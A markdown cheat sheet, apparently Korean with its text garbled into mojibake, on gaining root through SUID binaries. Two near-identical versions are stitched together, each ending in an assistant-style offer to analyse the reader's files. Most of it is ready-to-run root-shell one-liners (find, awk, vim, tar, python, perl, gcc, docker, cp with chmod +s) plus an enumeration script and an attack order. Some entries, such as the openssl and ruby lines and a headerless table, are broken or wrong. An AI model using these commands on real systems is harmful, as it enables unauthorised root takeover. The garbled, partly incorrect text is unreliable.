# SUID ë°”ì´ë„ˆë¦¬ë¥¼ ì´ìš©í•œ ê¶Œí•œ ìƒìŠ¹ ê¸°ë²•

> SUID(Set User ID) ë°”ì´ë„ˆë¦¬ë¥¼ í™œìš©í•œ ê¶Œí•œ ìƒìŠ¹ ê¸°ë²•ì„ ì²´ê³„ì ìœ¼ë¡œ ì •ë¦¬í•œ ë¬¸ì„œì…ë‹ˆë‹¤.

## ğŸ“‹ ëª©ì°¨
1. [ê¸°ë³¸ ê°œë…](#ê¸°ë³¸-ê°œë…)
2. [ë°”ì´ë„ˆë¦¬ë³„ ê³µê²© ê¸°ë²•](#ë°”ì´ë„ˆë¦¬ë³„-ê³µê²©-ê¸°ë²•)
3. [ê¶Œì¥ í…ŒìŠ¤íŠ¸ ìˆœì„œ](#ê¶Œì¥-í…ŒìŠ¤íŠ¸-ìˆœì„œ)
4. [íŒê³¼ ì£¼ì˜ì‚¬í•­](#íŒê³¼-ì£¼ì˜ì‚¬í•­)

---

## ê¸°ë³¸ ê°œë…

**SUID(Set User ID)** ê¶Œí•œì´ ì„¤ì •ëœ íŒŒì¼ì€ ì‹¤í–‰ ì‹œ íŒŒì¼ ì†Œìœ ìì˜ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ íŒŒì¼ì´ root ì†Œìœ ë¼ë©´, ì¼ë°˜ ì‚¬ìš©ìê°€ í•´ë‹¹ íŒŒì¼ì„ ì‹¤í–‰í•  ë•Œ root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆì–´ ê¶Œí•œ ìƒìŠ¹ì— í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ğŸ” SUID íŒŒì¼ ì‹ë³„ ë°©ë²•

**1. SUID íŒŒì¼ ì°¾ê¸°:**
```bash
# ì‹œìŠ¤í…œ ë‚´ ëª¨ë“  SUID íŒŒì¼ ì°¾ê¸°
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# ê°„ë‹¨í•˜ê²Œ ëª©ë¡ë§Œ ë³´ê¸°
find / -perm -4000 -type f 2>/dev/null
```

**2. ê¶Œí•œ ìƒìŠ¹ ê°€ëŠ¥ì„± ë¶„ì„:**

```bash
# ì†Œìœ ì ë° ê¶Œí•œ í™•ì¸
ls -l /ê²½ë¡œ/íŒŒì¼ëª…

# íŒŒì¼ ìœ í˜• ë¶„ì„
file /ê²½ë¡œ/íŒŒì¼ëª…

# ë‚´ë¶€ ë¬¸ìì—´ ê²€ì‚¬
strings /ê²½ë¡œ/íŒŒì¼ëª… | grep -i "sh\|bash\|system"

# ë¼ì´ë¸ŒëŸ¬ë¦¬ ì˜ì¡´ì„± í™•ì¸
ldd /ê²½ë¡œ/íŒŒì¼ëª…
```

**í™•ì¸ í¬ì¸íŠ¸:**
- ì†Œìœ ìê°€ `root`ì¸ê°€? 
- ê¶Œí•œì— **s ë¹„íŠ¸**ê°€ ìˆëŠ”ê°€? (ì˜ˆ: `-rwsr-xr-x`)
- ì‹¤í–‰ ê°€ëŠ¥í•œ ë°”ì´ë„ˆë¦¬ì¸ê°€?
- ì‰˜ ëª…ë ¹ì–´ë‚˜ ìœ„í—˜í•œ í•¨ìˆ˜ë¥¼ í¬í•¨í•˜ê³  ìˆëŠ”ê°€?

## ë°”ì´ë„ˆë¦¬ë³„ ê³µê²© ê¸°ë²•

SUID ë°”ì´ë„ˆë¦¬ ìœ í˜•ì— ë”°ë¼ ë‹¤ì–‘í•œ ê¶Œí•œ ìƒìŠ¹ ê¸°ë²•ì„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ëŠ” ë°”ì´ë„ˆë¦¬ ì¢…ë¥˜ë³„ë¡œ ì •ë¦¬í•œ ê³µê²© ê¸°ë²•ì…ë‹ˆë‹¤.

### ğŸ”¸ ì‰˜ ë° ê¸°ë³¸ ë„êµ¬

| ë°”ì´ë„ˆë¦¬ | ëª…ë ¹ì–´ | ì„¤ëª… |
|---------|--------|------|
| `bash` | ```/bin/bash -p``` | `-p` ì˜µì…˜ìœ¼ë¡œ SUID ê¶Œí•œ ë³´ì¡´ |
| `find` | ```find . -exec /bin/sh \; -quit``` | `-exec` ì˜µì…˜ìœ¼ë¡œ ëª…ë ¹ ì‹¤í–‰ |
| `env` | ```env /bin/sh``` | í™˜ê²½ë³€ìˆ˜ ì„¤ì • ë„êµ¬ë¡œ ì‰˜ ì‹¤í–‰ |
| `awk` | ```awk 'BEGIN {system("/bin/sh")}'``` | awk ë‚´ì—ì„œ ì‹œìŠ¤í…œ í•¨ìˆ˜ í˜¸ì¶œ |
| `cp` | ```cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh``` | SUID ë¹„íŠ¸ ì„¤ì •ëœ ì‰˜ ë³µì‚¬ |

---

#### âœ… ì¸í„°ë™í‹°ë¸Œ ëª…ë ¹ì–´ ì‰˜ ì§„ì…

| íŒŒì¼ëª…          | ëª…ë ¹ì–´                       |
| --------------- | ---------------------------- |
| `vim`           | `vim -c ':!sh'`              |
| `less`          | `less /etc/passwd` â†’ `!sh`   |
| `more`          | `more /etc/passwd` â†’ `!sh`   |
| `man`           | `man man` â†’ `!sh`            |
| `nmap` (êµ¬ë²„ì „) | `nmap --interactive` â†’ `!sh` |

---

#### âœ… ë¹Œë“œí˜• ë£¨íŠ¸ ì‰˜ ìƒì„±

| íŒŒì¼ëª… | ëª…ë ¹ì–´                                                                         |
| ------ | ------------------------------------------------------------------------------ |
| `gcc`  | `echo 'int main(){setuid(0);system("/bin/sh");}' > r.c && gcc r.c -o r && ./r` |

---

#### âœ… ê³ ê¸‰ í™œìš© / íŠ¹ìˆ˜ ìƒí™©

| íŒŒì¼ëª…             | ëª…ë ¹ì–´                                                                         |
| ------------------ | ------------------------------------------------------------------------------ |
| `tar`              | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`   |
| `docker`           | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` _(docker group í¬í•¨ ì‹œ)_ |
| `screen (v4.5.0-)` | `screen -D -m -L bash` _(êµ¬ë²„ì „ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì )_                             |

---

### 3. ğŸ§ª ê¶Œí•œ ìƒìŠ¹ ìŠ¤í¬ë¦½íŠ¸ ì˜ˆì‹œ (ìˆ˜ë™)

```bash
#!/bin/bash
echo "[+] SUID íŒŒì¼ ìˆ˜ì§‘ ì¤‘..."
find / -perm -4000 -type f 2>/dev/null | tee suid_list.txt

echo "[+] root ì†Œìœ ìë§Œ í•„í„°ë§:"
cat suid_list.txt | xargs -I{} ls -l {} | grep '^-rws.* root'

echo "[+] ê¶Œí•œ ìƒìŠ¹ ì‹œë„ ê°€ëŠ¥í•œ ë°”ì´ë„ˆë¦¬:"
grep -E 'find|bash|python|perl|awk|env|vim|less|more|nmap|cp|tar' suid_list.txt
```

---

### 4. ğŸ“Œ í•µì‹¬ ìš”ì•½

- **SUID ê¶Œí•œ ìƒìŠ¹ ì—¬ë¶€ íŒë‹¨ 4ë‹¨ê³„**:

  1. ì†Œìœ ìê°€ `root`ì¸ì§€ (`ls -l`)
  2. ì‹¤í–‰íŒŒì¼ì¸ì§€ (`file`)
  3. ì‰˜ í˜¸ì¶œ ê°€ëŠ¥ ì—¬ë¶€ (`strings`)
  4. ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì˜ì¡´ ì—¬ë¶€ (`ldd`)

- **ìµìŠ¤í”Œë¡œì‡ ì‹œë„ ìš°ì„ ìˆœìœ„**:

  1. ì‰˜ ì§ì ‘ ì‹¤í–‰ (`bash -p`, `find`, `python`)
  2. ì¸í„°ë™í‹°ë¸Œ ì‰˜ (`vim`, `less`, `nmap`)
  3. ë³µì‚¬ í›„ `chmod +s`
  4. ì»´íŒŒì¼í˜• ì‰˜ (`gcc`)
  5. íŠ¹ìˆ˜ ëª…ë ¹ (`tar`, `docker`, `screen`)

---

### 5. ğŸ§’ ì–´ë¦°ì´ ìš”ì•½

> â€œê´€ë¦¬ìê°€ ë§Œë“  íŠ¹ìˆ˜ í”„ë¡œê·¸ë¨(SUID)ì„ ì˜ ì‚´í´ë³´ë©´, ë‚´ê°€ ê´€ë¦¬ìì²˜ëŸ¼ í–‰ë™í•  ìˆ˜ ìˆëŠ” ë¹„ë°€ í†µë¡œê°€ ìˆì–´ìš”. ê·¸ ë¬¸ì„ ì—¬ëŠ” ë§ˆë²• ì£¼ë¬¸(ëª…ë ¹ì–´)ì„ ì˜ ì“°ë©´ â€˜ë£¨íŠ¸ ê¶Œí•œâ€™ì„ ì–»ì„ ìˆ˜ ìˆì£ !â€

---

í•„ìš”í•˜ì‹œë©´ `find` ëª…ë ¹ìœ¼ë¡œ ë°œê²¬í•œ SUID íŒŒì¼ ëª©ë¡ì„ ì£¼ì‹œë©´, ì–´ë–¤ ê²Œ ì‹¤ì œë¡œ ê¶Œí•œ ìƒìŠ¹ ê°€ëŠ¥í•œì§€ êµ¬ì²´ì ìœ¼ë¡œ ë¶„ì„í•´ë“œë¦´ê²Œìš”!

# SUID ë°”ì´ë„ˆë¦¬ë¥¼ ì´ìš©í•œ ê¶Œí•œ ìƒìŠ¹ ê¸°ë²•

> SUID ë°”ì´ë„ˆë¦¬ë¥¼ ë°œê²¬í–ˆì„ ë•Œ í™œìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ê¶Œí•œ ìƒìŠ¹ ê¸°ë²•ì„ ì •ë¦¬í•œ ë¬¸ì„œì…ë‹ˆë‹¤.

## ğŸ“‹ ëª©ì°¨

1. [ê¸°ë³¸ ê°œë…](#ê¸°ë³¸-ê°œë…)
2. [ë°”ì´ë„ˆë¦¬ë³„ ê³µê²© ê¸°ë²•](#ë°”ì´ë„ˆë¦¬ë³„-ê³µê²©-ê¸°ë²•)
3. [ê¶Œì¥ í…ŒìŠ¤íŠ¸ ìˆœì„œ](#ê¶Œì¥-í…ŒìŠ¤íŠ¸-ìˆœì„œ)
4. [íŒê³¼ ì£¼ì˜ì‚¬í•­](#íŒê³¼-ì£¼ì˜ì‚¬í•­)

## ê¸°ë³¸ ê°œë…

**SUID(Set User ID)** ê¶Œí•œì´ ì„¤ì •ëœ íŒŒì¼ì€ ì‹¤í–‰ ì‹œ íŒŒì¼ ì†Œìœ ìì˜ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ íŒŒì¼ì´ root ì†Œìœ ë¼ë©´, ì¼ë°˜ ì‚¬ìš©ìê°€ í•´ë‹¹ íŒŒì¼ì„ ì‹¤í–‰í•  ë•Œ root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆì–´ ê¶Œí•œ ìƒìŠ¹ì— í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

SUID íŒŒì¼ í™•ì¸ ëª…ë ¹ì–´:

```bash
# ì‹œìŠ¤í…œ ë‚´ ëª¨ë“  SUID íŒŒì¼ ì°¾ê¸°
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

## ë°”ì´ë„ˆë¦¬ë³„ ê³µê²© ê¸°ë²•

### ğŸ”¸ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ ì¸í„°í”„ë¦¬í„°

| ë°”ì´ë„ˆë¦¬ | ëª…ë ¹ì–´                                                                | ì„¤ëª…                             |
| -------- | --------------------------------------------------------------------- | -------------------------------- |
| `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`           | ë£¨íŠ¸ UID ì„¤ì • í›„ ì‰˜ ì‹¤í–‰         |
| `perl`   | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'`                     | POSIX ëª¨ë“ˆ ì‚¬ìš©í•˜ì—¬ ë£¨íŠ¸ ì‰˜ ì‹¤í–‰ |
| `ruby`   | `ruby -e 'require "fileutils"; FileUtils.chmod(0700, "/etc/shadow")'` | íŒŒì¼ ê¶Œí•œ ë³€ê²½                   |

### ğŸ”¸ ì‰˜ ë° ëª…ë ¹ì–´ ì‹¤í–‰ ë„êµ¬

| 2 | `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` | ë£¨íŠ¸ UID ì„¤ì • í›„ ì‰˜ |
| 3 | `perl` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'` | ë£¨íŠ¸ ì‰˜ ì‹¤í–‰ |
| 4 | `bash` | `/bin/bash -p` | `-p`: SUID ë³´ì¡´ ì‰˜ ì‹¤í–‰ |
| 5 | `cp` | `cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh` | ë£¨íŠ¸ ì‰˜ ë³µì‚¬ & SUID ì„¤ì • |
| 6 | `env` | `env /bin/sh` | `env`ë¡œ ì‰˜ ì‹¤í–‰ |
| 7 | `vim` | `vim -c ':!sh'` | vim ëª…ë ¹ì–´ë¡œ ì‰˜ ì‹¤í–‰ |
| 8 | `less` | `less /etc/passwd`, `!sh` | `!` ëª…ë ¹ì–´ë¡œ ì‰˜ ì‹¤í–‰ |
| 9 | `more` | `more /etc/passwd`, `!sh` | ë§ˆì°¬ê°€ì§€ë¡œ `!sh` |
| 10 | `nmap` (êµ¬ë²„ì „) | `nmap --interactive` â†’ `!sh` | interactive ëª¨ë“œ ì‰˜ ì‹¤í–‰ |
| 11 | `awk` | `awk 'BEGIN {system("/bin/sh")}'` | awk ë‚´ì¥ ì‰˜ ì‹¤í–‰ |
| 12 | `man` | `man man` â†’ `!sh` | `less` ë‚´ì¥, `!`ë¡œ ì‰˜ |
| 13 | `tar` | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | ì²´í¬í¬ì¸íŠ¸ë¡œ ì‰˜ ì‹¤í–‰ |
| 14 | `openssl` | `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes -subj '/' -config <(echo '[req]'; echo 'distinguished_name=req'; echo '[req_ext]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_req]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_ca]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_ca]'; echo 'extendedKeyUsage=serverAuth, clientAuth'; echo 'basicConstraints=CA:TRUE'; echo 'keyUsage = keyCertSign, cRLSign'; echo '[ca]'; echo 'default_ca = CA_default'; echo '[CA_default]'; echo 'dir = ./demoCA'; echo 'certificate = ./demoCA/cacert.pem'; echo 'private_key = ./demoCA/private/cakey.pem'; echo 'new_certs_dir = ./demoCA/newcerts'; echo 'database = ./demoCA/index.txt'; echo 'serial = ./demoCA/serial'; echo 'crlnumber = ./demoCA/crlnumber'; echo 'RANDFILE = ./demoCA/private/.rand'; echo 'x509_extensions = v3_ca'; echo '[usr_cert]'; echo 'subjectAltName=DNS:localhost')` | opensslë¡œ root íŒŒì¼ ì‘ì„± ê°€ëŠ¥ì„± (ë³µì¡í•¨) |
| 15 | `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | ë£¨íŠ¸ ì»¨í…Œì´ë„ˆ ê¶Œí•œ (docker group) |
| 16 | `screen` (4.5.0 ì´í•˜) | `screen -D -m -L bash` | íŠ¹ì • ë²„ì „ì—ì„œ ê¶Œí•œ ìƒìŠ¹ |
| 17 | `gcc` | `echo 'int main(){setuid(0);system("/bin/sh");}' > r.c && gcc r.c -o r && ./r` | ì§ì ‘ ë£¨íŠ¸ ì‰˜ ìƒì„± |

---

## ğŸ§ª í…ŒìŠ¤íŠ¸ ìˆœì„œ ì¶”ì²œ

1. ê°„ë‹¨í•œ ëª…ë ¹ì–´ (`bash -p`, `find`, `python`)ë¶€í„° ì‹œë„
2. interactive ë°©ì‹ (`vim`, `nmap`)
3. ë³µì‚¬í•´ì„œ SUID ì£¼ëŠ” ë°©ë²• (`cp`, `chmod +s`)
4. ì·¨ì•½ ë²„ì „(`screen`, `nmap`) ì²´í¬
5. ì»¨í…Œì´ë„ˆ, ê¶Œí•œ íŒŒì¼ ì‘ì„± ë“± ê³ ê¸‰ ë°©ì‹

---

## ğŸ“Œ íŒ

- ëŒ€ë¶€ë¶„ SUIDëŠ” `/usr/bin`, `/bin`, `/usr/local/bin`ì— ì¡´ì¬
- `ls -l`ë¡œ **ownerê°€ rootì¸ì§€ ë°˜ë“œì‹œ í™•ì¸**
- `strings`, `ldd`, `file`ë¡œ ë‚´ë¶€ í™•ì¸í•˜ì—¬ ì‰˜ ì‹¤í–‰ ì—¬ë¶€ ë¶„ì„ ê°€ëŠ¥

---

ë” í•„ìš”í•œ íŒŒì¼ì´ë‚˜ ê²°ê³¼ ìˆìœ¼ë©´ ì•Œë ¤ì£¼ì„¸ìš”. í•´ë‹¹ íŒŒì¼ë¡œ êµ¬ì²´ì ì¸ ê¶Œí•œ ìƒìŠ¹ ë°©ë²•ë„ ë„ì™€ë“œë¦´ê²Œìš”.
